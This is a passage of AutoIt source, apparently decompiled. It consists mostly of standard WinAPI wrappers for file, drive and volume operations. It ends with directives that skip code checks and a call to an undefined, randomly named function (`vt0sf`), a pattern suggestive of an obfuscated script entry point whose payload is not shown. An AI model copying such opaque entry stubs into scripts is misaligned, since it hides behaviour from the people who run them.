		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $aresult[3]
		For $i = 0 To 2
			$aresult[$i] = $aret[$i + 2]
		Next
		Return $aresult
	EndFunc

	Func _winapi_getdrivebustype($sdrive)
		Local $hfile = _winapi_createfileex("\\.\" & $sdrive, $open_existing, 0, $file_share_readwrite)
		If @error Then Return SetError(@error + 20, @extended, -1)
		Local $tagstorage_property_query = "ulong PropertyId;ulong QueryType;byte AdditionalParameters[1]"
		Local $tspq = DllStructCreate($tagstorage_property_query)
		Local $tsdd = DllStructCreate("ulong Version;ulong Size;byte DeviceType;byte DeviceTypeModifier;byte RemovableMedia;byte CommandQueueing;ulong VendorIdOffset;ulong ProductIdOffset;ulong ProductRevisionOffset;ulong SerialNumberOffset;ulong BusType;ulong RawPropertiesLength;byte RawDeviceProperties[1]")
		DllStructSetData($tspq, "PropertyId", 0)
		DllStructSetData($tspq, "QueryType", 0)
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 2954240, "struct*", $tspq, "dword", DllStructGetSize($tspq), "struct*", $tsdd, "dword", DllStructGetSize($tsdd), "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, -1)
		Return DllStructGetData($tsdd, "BusType")
	EndFunc

	Func _winapi_getdrivegeometryex($idrive)
		Local $hfile = _winapi_createfileex("\\.\PhysicalDrive" & $idrive, $open_existing, 0, $file_share_readwrite)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $tdgex = DllStructCreate("uint64;dword;dword;dword;dword;uint64")
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 458912, "ptr", 0, "dword", 0, "struct*", $tdgex, "dword", DllStructGetSize($tdgex), "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, 0)
		Local $aresult[6]
		For $i = 0 To 5
			$aresult[$i] = DllStructGetData($tdgex, $i + 1)
		Next
		Return $aresult
	EndFunc

	Func _winapi_getdrivenumber($sdrive)
		Local $hfile = _winapi_createfileex("\\.\" & $sdrive, $open_existing, 0, $file_share_readwrite)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $tsdn = DllStructCreate("dword;ulong;ulong")
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 2953344, "ptr", 0, "dword", 0, "struct*", $tsdn, "dword", DllStructGetSize($tsdn), "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, 0)
		Local $aresult[3]
		For $i = 0 To 2
			$aresult[$i] = DllStructGetData($tsdn, $i + 1)
		Next
		Return $aresult
	EndFunc

	Func _winapi_getdrivetype($sdrive = "")
		Local $itypeofdrive = "str"
		If NOT StringStripWS($sdrive, $str_stripleading + $str_striptrailing) Then
			$itypeofdrive = "ptr"
			$sdrive = 0
		EndIf
		Local $aret = DllCall("kernel32.dll", "uint", "GetDriveType", $itypeofdrive, $sdrive)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getfileattributes($sfilepath)
		Local $aret = DllCall("kernel32.dll", "dword", "GetFileAttributesW", "wstr", $sfilepath)
		If @error OR ($aret[0] = 4294967295) Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getfileid($hfile)
		Local $tiosb = DllStructCreate("ptr;ulong_ptr")
		Local $aret = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "int64*", 0, "ulong", 8, "uint", 6)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return $aret[3]
	EndFunc

	Func _winapi_getfileinformationbyhandle($hfile)
		Local $tbhfi = DllStructCreate("dword;dword[2];dword[2];dword[2];dword;dword;dword;dword;dword;dword")
		Local $aret = DllCall("kernel32.dll", "bool", "GetFileInformationByHandle", "handle", $hfile, "struct*", $tbhfi)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $aresult[8]
		$aresult[0] = DllStructGetData($tbhfi, 1)
		For $i = 1 To 3
			If DllStructGetData($tbhfi, $i + 1) Then
				$aresult[$i] = DllStructCreate($tagfiletime)
				_winapi_movememory($aresult[$i], DllStructGetPtr($tbhfi, $i + 1), 8)
			Else
				$aresult[$i] = 0
			EndIf
		Next
		$aresult[4] = DllStructGetData($tbhfi, 5)
		$aresult[5] = __winapi_makeqword(DllStructGetData($tbhfi, 7), DllStructGetData($tbhfi, 6))
		$aresult[6] = DllStructGetData($tbhfi, 8)
		$aresult[7] = __winapi_makeqword(DllStructGetData($tbhfi, 9), DllStructGetData($tbhfi, 10))
		Return $aresult
	EndFunc

	Func _winapi_getfileinformationbyhandleex($hfile)
		Local $tfi = DllStructCreate($tagfileinfo)
		Local $tiosb = DllStructCreate("ptr;ulong_ptr")
		Local $aret = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "struct*", $tfi, "ulong", DllStructGetSize($tfi), "uint", 4)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return $tfi
	EndFunc

	Func _winapi_getfilepointerex($hfile)
		Local $tiosb = DllStructCreate("ptr;ulong_ptr")
		Local $aret = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "int64*", 0, "ulong", 8, "uint", 14)
		If @error Then Return SetError(@error, @extended, "")
		If $aret[0] Then Return SetError(10, $aret[0], "")
		Return $aret[3]
	EndFunc

	Func _winapi_getfilesizeondisk($sfilepath)
		Local $isize = FileGetSize($sfilepath)
		If @error Then Return SetError(@error + 10, @extended, 0)
		Local $aret = DllCall("kernel32.dll", "bool", "GetDiskFreeSpaceW", "wstr", _winapi_pathstriptoroot(_winapi_getfullpathname($sfilepath)), "dword*", 0, "dword*", 0, "dword*", 0, "dword*", 0)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		Return Ceiling($isize / ($aret[2] * $aret[3])) * ($aret[2] * $aret[3])
	EndFunc

	Func _winapi_getfiletitle($sfilepath)
		Local $aret = DllCall("comdlg32.dll", "short", "GetFileTitleW", "wstr", $sfilepath, "wstr", "", "word", 4096)
		If @error OR $aret[0] Then Return SetError(@error, @extended, "")
		Return $aret[2]
	EndFunc

	Func _winapi_getfiletype($hfile)
		Local $aret = DllCall("kernel32.dll", "dword", "GetFileType", "handle", $hfile)
		If @error Then Return SetError(@error, @extended, -1)
		Local $ilasterror = _winapi_getlasterror()
		If NOT $aret[0] AND $ilasterror Then Return SetError(10, $ilasterror, -1)
		Return $aret[0]
	EndFunc

	Func _winapi_getfinalpathnamebyhandle($hfile)
		Local $tfni = DllStructCreate("ulong;wchar[4096]")
		Local $tiosb = DllStructCreate("ptr;ulong_ptr")
		Local $aret = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "struct*", $tfni, "ulong", DllStructGetSize($tfni), "uint", 9)
		If @error Then Return SetError(@error, @extended, "")
		If $aret[0] Then Return SetError(10, $aret[0], "")
		Local $ilength = DllStructGetData($tfni, 1)
		If NOT $ilength Then Return SetError(12, 0, "")
		Return DllStructGetData(DllStructCreate("wchar[" & ($ilength / 2) & "]", DllStructGetPtr($tfni, 2)), 1)
	EndFunc

	Func _winapi_getfinalpathnamebyhandleex($hfile, $iflags = 0)
		Local $aret = DllCall("kernel32.dll", "dword", "GetFinalPathNameByHandleW", "handle", $hfile, "wstr", "", "dword", 4096, "dword", $iflags)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[2]
	EndFunc

	Func _winapi_getfullpathname($sfilepath)
		Local $aret = DllCall("kernel32.dll", "dword", "GetFullPathNameW", "wstr", $sfilepath, "dword", 4096, "wstr", "", "ptr", 0)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
		Return $aret[3]
	EndFunc

	Func _winapi_getlogicaldrives()
		Local $aret = DllCall("kernel32.dll", "dword", "GetLogicalDrives")
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getobjectid($sfilepath)
		Local $hfile = _winapi_createfileex($sfilepath, $open_existing, 0, $file_share_readwrite, $file_flag_backup_semantics)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $tfoid = DllStructCreate("byte[16];byte[48]")
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 589980, "ptr", 0, "dword", 0, "struct*", $tfoid, "dword", DllStructGetSize($tfoid), "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, 0)
		Local $tguid = DllStructCreate($tagguid)
		_winapi_movememory($tguid, $tfoid, 16)
		Return $tguid
	EndFunc

	Func _winapi_getpetype($sfilepath)
		Local $tdata = DllStructCreate("ushort[2]")
		Local $tuint = DllStructCreate("uint", DllStructGetPtr($tdata))
		Local $hfile = _winapi_createfileex($sfilepath, $open_existing, $generic_read, $file_share_readwrite)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $ierror = 0, $ival
		Do
			Local $aret = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $tdata, "dword", 2, "dword*", 0, "ptr", 0)
			If @error OR (NOT $aret[0]) OR ($aret[4] <> 2) Then
				$ierror = @error + 30
				ExitLoop
			EndIf
			$ival = DllStructGetData($tdata, 1, 1)
			If $ival <> 23117 Then
				$ierror = 3
				ExitLoop
			EndIf
			If NOT _winapi_setfilepointerex($hfile, 60) Then
				$ierror = @error + 40
				ExitLoop
			EndIf
			$aret = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $tdata, "dword", 4, "dword*", 0, "ptr", 0)
			If @error OR (NOT $aret[0]) OR ($aret[4] <> 4) Then
				$ierror = @error + 50
				ExitLoop
			EndIf
			If NOT _winapi_setfilepointerex($hfile, DllStructGetData($tuint, 1)) Then
				$ierror = @error + 60
				ExitLoop
			EndIf
			$aret = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $tdata, "dword", 4, "dword*", 0, "ptr", 0)
			If @error OR (NOT $aret[0]) OR ($aret[4] <> 4) Then
				$ierror = @error + 70
				ExitLoop
			EndIf
			$ival = DllStructGetData($tuint, 1)
			If $ival <> 17744 Then
				$ierror = 4
				ExitLoop
			EndIf
			$aret = DllCall("kernel32.dll", "bool", "ReadFile", "handle", $hfile, "struct*", $tdata, "dword", 2, "dword*", 0, "ptr", 0)
			If @error OR (NOT $aret[0]) OR ($aret[4] <> 2) Then
				$ierror = @error + 80
				ExitLoop
			EndIf
			$ival = DllStructGetData($tdata, 1, 1)
		Until 1
		DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
		If $ierror Then Return SetError($ierror, 0, 0)
		Return $ival
	EndFunc

	Func _winapi_getprofilesdirectory()
		Local $aret = DllCall("userenv.dll", "bool", "GetProfilesDirectoryW", "wstr", "", "dword*", 4096)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[1]
	EndFunc

	Func _winapi_gettempfilename($sfilepath, $sprefix = "")
		Local $aret = DllCall("kernel32.dll", "uint", "GetTempFileNameW", "wstr", $sfilepath, "wstr", $sprefix, "uint", 0, "wstr", "")
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[4]
	EndFunc

	Func _winapi_getvolumeinformation($sroot = "")
		Local $stypeofroot = "wstr"
		If NOT StringStripWS($sroot, $str_stripleading + $str_striptrailing) Then
			$stypeofroot = "ptr"
			$sroot = 0
		EndIf
		Local $aret = DllCall("kernel32.dll", "bool", "GetVolumeInformationW", $stypeofroot, $sroot, "wstr", "", "dword", 4096, "dword*", 0, "dword*", 0, "dword*", 0, "wstr", "", "dword", 4096)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $aresult[5]
		For $i = 0 To 4
			Switch $i
				Case 0
					$aresult[$i] = $aret[2]
				Case Else
					$aresult[$i] = $aret[$i + 3]
			EndSwitch
		Next
		Return $aresult
	EndFunc

	Func _winapi_getvolumeinformationbyhandle($hfile)
		Local $aret = DllCall("kernel32.dll", "bool", "GetVolumeInformationByHandleW", "handle", $hfile, "wstr", "", "dword", 4096, "dword*", 0, "dword*", 0, "dword*", 0, "wstr", "", "dword", 4096)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $aresult[5]
		For $i = 0 To 4
			Switch $i
				Case 0
					$aresult[$i] = $aret[2]
				Case Else
					$aresult[$i] = $aret[$i + 3]
			EndSwitch
		Next
		Return $aresult
	EndFunc

	Func _winapi_getvolumenameforvolumemountpoint($smountedpath)
		Local $aret = DllCall("kernel32.dll", "bool", "GetVolumeNameForVolumeMountPointW", "wstr", $smountedpath, "wstr", "", "dword", 80)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[2]
	EndFunc

	Func _winapi_ioctl($idevicetype, $ifunction, $imethod, $iaccess)
		Return BitOR(BitShift($idevicetype, -16), BitShift($iaccess, -14), BitShift($ifunction, -2), $imethod)
	EndFunc

	Func _winapi_isdooropen($sdrive)
		Local $hfile = _winapi_createfileex("\\.\" & $sdrive, $open_existing, $generic_readwrite, $file_share_readwrite)
		If @error Then Return SetError(@error + 20, @extended, False)
		Local $tspt = DllStructCreate("ushort Length;byte ScsiStatus;byte PathId;byte TargetId;byte Lun;byte CdbLength;byte SenseInfoLength;byte DataIn;byte Alignment[3];ulong DataTransferLength;ulong TimeOutValue;ulong_ptr DataBufferOffset;ulong SenseInfoOffset;byte Cdb[16]" & __iif(@AutoItX64, ";byte[4]", "") & ";byte Hdr[8]")
		Local $tcdb = DllStructCreate("byte;byte;byte[6];byte[2];byte;byte;byte[4]", DllStructGetPtr($tspt, "Cdb"))
		Local $thdr = DllStructCreate("byte;byte;byte[3];byte;byte[2]", DllStructGetPtr($tspt, "Hdr"))
		Local $isize = DllStructGetPtr($tspt, "Hdr") - DllStructGetPtr($tspt)
		DllStructSetData($tspt, "Length", $isize)
		DllStructSetData($tspt, "ScsiStatus", 0)
		DllStructSetData($tspt, "PathId", 0)
		DllStructSetData($tspt, "TargetId", 0)
		DllStructSetData($tspt, "Lun", 0)
		DllStructSetData($tspt, "CdbLength", 12)
		DllStructSetData($tspt, "SenseInfoLength", 0)
		DllStructSetData($tspt, "DataIn", 1)
		DllStructSetData($tspt, "DataTransferLength", 8)
		DllStructSetData($tspt, "TimeOutValue", 86400)
		DllStructSetData($tspt, "DataBufferOffset", $isize)
		DllStructSetData($tspt, "SenseInfoOffset", 0)
		DllStructSetData($tcdb, 1, 189)
		DllStructSetData($tcdb, 2, 0)
		DllStructSetData($tcdb, 4, 0, 1)
		DllStructSetData($tcdb, 4, 8, 2)
		DllStructSetData($tcdb, 5, 0)
		DllStructSetData($tcdb, 6, 0)
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 315396, "struct*", $tspt, "dword", $isize, "struct*", $tspt, "dword", DllStructGetSize($tspt), "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, False)
		Return (BitAND(DllStructGetData($thdr, 2), 16) = 16)
	EndFunc

	Func _winapi_ispathshared($sfilepath)
		If NOT __dll("ntshrui.dll") Then Return SetError(103, 0, 0)
		Local $aret = DllCall("ntshrui.dll", "bool", "IsPathSharedW", "wstr", _winapi_pathremovebackslash($sfilepath), "int", 1)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_iswritable($sdrive)
		DriveGetFileSystem($sdrive)
		If @error Then Return SetError(40 + @error, _winapi_getlasterror(), 0)
		Local $hfile = _winapi_createfileex("\\.\" & $sdrive, $open_existing, 0, $file_share_readwrite)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 458788, "ptr", 0, "dword", 0, "ptr", 0, "dword", 0, "dword*", 0, "ptr", 0)
		Local Const $error_write_protect = 19
		If __checkerrorclosehandle($aret, $hfile, 1) <> 10 AND @extended = $error_write_protect Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_loadmedia($sdrive)
		Local $hfile = _winapi_createfileex("\\.\" & $sdrive, $open_existing, $generic_read, $file_share_readwrite)
		If @error Then Return SetError(@error + 20, @extended, False)
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 2967564, "ptr", 0, "dword", 0, "ptr", 0, "dword", 0, "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_lockdevice($sdrive, $block)
		Local $hfile = _winapi_createfileex("\\.\" & $sdrive, $open_existing, $generic_readwrite, $file_share_readwrite)
		If @error Then Return SetError(@error + 20, @extended, False)
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 2967556, "boolean*", $block, "dword", 1, "ptr", 0, "dword", 0, "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_lockfile($hfile, $ioffset, $ilength)
		Local $aret = DllCall("kernel32.dll", "bool", "LockFile", "handle", $hfile, "dword", _winapi_lodword($ioffset), "dword", _winapi_hidword($ioffset), "dword", _winapi_lodword($ilength), "dword", _winapi_hidword($ilength))
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_mapviewoffile($hmapping, $ioffset = 0, $ibytes = 0, $iaccess = 6)
		Local $aret = DllCall("kernel32.dll", "ptr", "MapViewOfFile", "handle", $hmapping, "dword", $iaccess, "dword", _winapi_hidword($ioffset), "dword", _winapi_lodword($ioffset), "ulong_ptr", $ibytes)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_movefileex($sexistingfile, $snewfile, $iflags = 0, $pprogressproc = 0, $pdata = 0)
		Local $stypeofnewfile = "wstr"
		If NOT StringStripWS($snewfile, $str_stripleading + $str_striptrailing) Then
			$stypeofnewfile = "ptr"
			$snewfile = 0
		EndIf
		Local $aret = DllCall("kernel32.dll", "bool", "MoveFileWithProgressW", "wstr", $sexistingfile, $stypeofnewfile, $snewfile, "ptr", $pprogressproc, "ptr", $pdata, "dword", $iflags)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_openfilebyid($hfile, $vid, $iaccess = 0, $ishare = 0, $iflags = 0)
		Local $tfidd = DllStructCreate("dword;uint;int64;int64")
		Local $hobj, $aret, $itype, $ierror = 0
		Select 
			Case IsString($vid)
				$aret = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", $vid, "ptr", DllStructGetPtr($tfidd, 3))
				If @error OR $aret[0] Then
					Return SetError(@error + 30, 0, 0)
				EndIf
				$itype = 1
			Case IsDllStruct($vid)
				If NOT _winapi_movememory(DllStructGetPtr($tfidd, 3), DllStructGetPtr($vid), 16) Then
					Return SetError(@error + 40, 0, 0)
				EndIf
				$itype = 1
			Case Else
				DllStructSetData($tfidd, 3, $vid)
				$itype = 0
		EndSelect
		DllStructSetData($tfidd, 1, DllStructGetSize($tfidd))
		DllStructSetData($tfidd, 2, $itype)
		If IsString($hfile) Then
			$hobj = _winapi_createfileex($hfile, $open_existing, 0, $file_share_readwrite, $file_flag_backup_semantics)
			If @error Then Return SetError(@error + 20, @extended, 0)
		Else
			$hobj = $hfile
		EndIf
		$aret = DllCall("kernel32.dll", "handle", "OpenFileById", "handle", $hobj, "struct*", $tfidd, "dword", $iaccess, "dword", $ishare, "ptr", 0, "dword", $iflags)
		If @error OR ($aret[0] = Ptr(-1)) Then $ierror = @error + 10
		If IsString($hfile) Then
			DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hobj)
		EndIf
		If $ierror Then Return SetError($ierror, 0, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_openfilemapping($sname, $iaccess = 6, $binherit = False)
		Local $aret = DllCall("kernel32.dll", "handle", "OpenFileMappingW", "dword", $iaccess, "bool", $binherit, "wstr", $sname)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_pathisdirectoryempty($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsDirectoryEmptyW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_querydosdevice($sdevice)
		Local $stypeofdevice = "wstr"
		If NOT StringStripWS($sdevice, $str_stripleading + $str_striptrailing) Then
			$stypeofdevice = "ptr"
			$sdevice = 0
		EndIf
		Local $tdata = DllStructCreate("wchar[16384]")
		Local $aret = DllCall("kernel32.dll", "dword", "QueryDosDeviceW", $stypeofdevice, $sdevice, "struct*", $tdata, "dword", 16384)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Local $aresult = _winapi_structtoarray($tdata)
		If IsString($sdevice) Then
			$aresult = $aresult[1]
		EndIf
		Return $aresult
	EndFunc

	Func _winapi_readdirectorychanges($hdirectory, $ifilter, $pbuffer, $ilength, $bsubtree = 0)
		Local $aret = DllCall("kernel32.dll", "bool", "ReadDirectoryChangesW", "handle", $hdirectory, "struct*", $pbuffer, "dword", $ilength - Mod($ilength, 4), "bool", $bsubtree, "dword", $ifilter, "dword*", 0, "ptr", 0, "ptr", 0)
		If @error OR NOT $aret[0] OR (NOT $aret[6]) Then Return SetError(@error + 10, @extended, 0)
		$pbuffer = $aret[2]
		Local $adata[101][2] = [[0]]
		Local $tfni, $ibuffer = 0, $ioffset = 0
		Do
			$ibuffer += $ioffset
			$tfni = DllStructCreate("dword NextEntryOffset;dword Action;dword FileNameLength;wchar FileName[" & (DllStructGetData(DllStructCreate("dword FileNameLength", $pbuffer + $ibuffer + 8), 1) / 2) & "]", $pbuffer + $ibuffer)
			__inc($adata)
			$adata[$adata[0][0]][0] = DllStructGetData($tfni, "FileName")
			$adata[$adata[0][0]][1] = DllStructGetData($tfni, "Action")
			$ioffset = DllStructGetData($tfni, "NextEntryOffset")
		Until NOT $ioffset
		__inc($adata, -1)
		Return $adata
	EndFunc

	Func _winapi_removedirectory($sdirpath)
		Local $aret = DllCall("kernel32.dll", "bool", "RemoveDirectoryW", "wstr", $sdirpath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_reopenfile($hfile, $iaccess, $ishare, $iflags = 0)
		Local $aret = DllCall("kernel32.dll", "handle", "ReOpenFile", "handle", $hfile, "dword", $iaccess, "dword", $ishare, "dword", $iflags)
		If @error OR ($aret[0] = Ptr(-1)) Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_replacefile($sreplacedfile, $sreplacementfile, $sbackupfile = "", $iflags = 0)
		Local $stypeofbackupfile = "wstr"
		If NOT StringStripWS($sbackupfile, $str_stripleading + $str_striptrailing) Then
			$stypeofbackupfile = "ptr"
			$sbackupfile = 0
		EndIf
		Local $aret = DllCall("kernel32.dll", "bool", "ReplaceFileW", "wstr", $sreplacedfile, "wstr", $sreplacementfile, $stypeofbackupfile, $sbackupfile, "dword", $iflags, "ptr", 0, "ptr", 0)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_searchpath($sfilepath, $ssearchpath = "")
		Local $stypeofpath = "wstr"
		If NOT StringStripWS($ssearchpath, $str_stripleading + $str_striptrailing) Then
			$stypeofpath = "ptr"
			$ssearchpath = 0
		EndIf
		Local $aret = DllCall("kernel32.dll", "dword", "SearchPathW", $stypeofpath, $ssearchpath, "wstr", $sfilepath, "ptr", 0, "dword", 4096, "wstr", "", "ptr", 0)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[5]
	EndFunc

	Func _winapi_setcompression($sfilepath, $icompression)
		Local $hfile = _winapi_createfileex($sfilepath, $open_existing, $generic_readwrite, $file_share_readwrite, $file_flag_backup_semantics)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $aret = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 639040, "ushort*", $icompression, "dword", 2, "ptr", 0, "dword", 0, "dword*", 0, "ptr", 0)
		If __checkerrorclosehandle($aret, $hfile) Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

	Func _winapi_setcurrentdirectory($sdir)
		Local $aret = DllCall("kernel32.dll", "int", "SetCurrentDirectoryW", "wstr", $sdir)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setfileattributes($sfilepath, $iattributes)
		Local $aret = DllCall("kernel32.dll", "int", "SetFileAttributesW", "wstr", $sfilepath, "dword", $iattributes)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setfileinformationbyhandleex($hfile, $tfileinfo)
		Local $aret = DllCall("ntdll.dll", "long", "ZwSetInformationFile", "handle", $hfile, "struct*", $tfileinfo, "struct*", $tfileinfo, "ulong", DllStructGetSize($tfileinfo), "uint", 4)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return 1
	EndFunc

	Func _winapi_setfilepointerex($hfile, $ipos, $imethod = 0)
		Local $aret = DllCall("kernel32.dll", "bool", "SetFilePointerEx", "handle", $hfile, "int64", $ipos, "int64*", 0, "dword", $imethod)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setfileshortname($hfile, $sshortname)
		Local $aret = DllCall("kernel32.dll", "bool", "SetFileShortNameW", "handle", $hfile, "wstr", $sshortname)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setfilevaliddata($hfile, $ilength)
		Local $aret = DllCall("kernel32.dll", "bool", "SetFileValidData", "handle", $hfile, "int64", $ilength)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setsearchpathmode($iflags)
		Local $aret = DllCall("kernel32.dll", "bool", "SetSearchPathMode", "dword", $iflags)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setvolumemountpoint($sfilepath, $sguid)
		Local $aret = DllCall("kernel32.dll", "bool", "SetVolumeMountPointW", "wstr", $sfilepath, "wstr", $sguid)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_sfcisfileprotected($sfilepath)
		If NOT __dll("sfc.dll") Then Return SetError(103, 0, False)
		Local $aret = DllCall("sfc.dll", "bool", "SfcIsFileProtected", "handle", 0, "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_unlockfile($hfile, $ioffset, $ilength)
		Local $aret = DllCall("kernel32.dll", "bool", "UnlockFile", "handle", $hfile, "dword", _winapi_lodword($ioffset), "dword", _winapi_hidword($ioffset), "dword", _winapi_lodword($ilength), "dword", _winapi_hidword($ilength))
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_unmapviewoffile($paddress)
		Local $aret = DllCall("kernel32.dll", "bool", "UnmapViewOfFile", "ptr", $paddress)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_wow64enablewow64fsredirection($benable)
		Local $aret = DllCall("kernel32.dll", "boolean", "Wow64EnableWow64FsRedirection", "boolean", $benable)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

#EndRegion Public Functions
#Region Internal Functions

	Func __winapi_makeqword($ilodword, $ihidword)
		Local $tint64 = DllStructCreate("uint64")
		Local $tdwords = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
		DllStructSetData($tdwords, 1, $ilodword)
		DllStructSetData($tdwords, 2, $ihidword)
		Return DllStructGetData($tint64, 1)
	EndFunc

#EndRegion Internal Functions
#AutoIt3Wrapper_Run_Au3Stripper=n
#AutoIt3Wrapper_Run_AU3Check=n
Local $vt0s02f0
vt0sf()
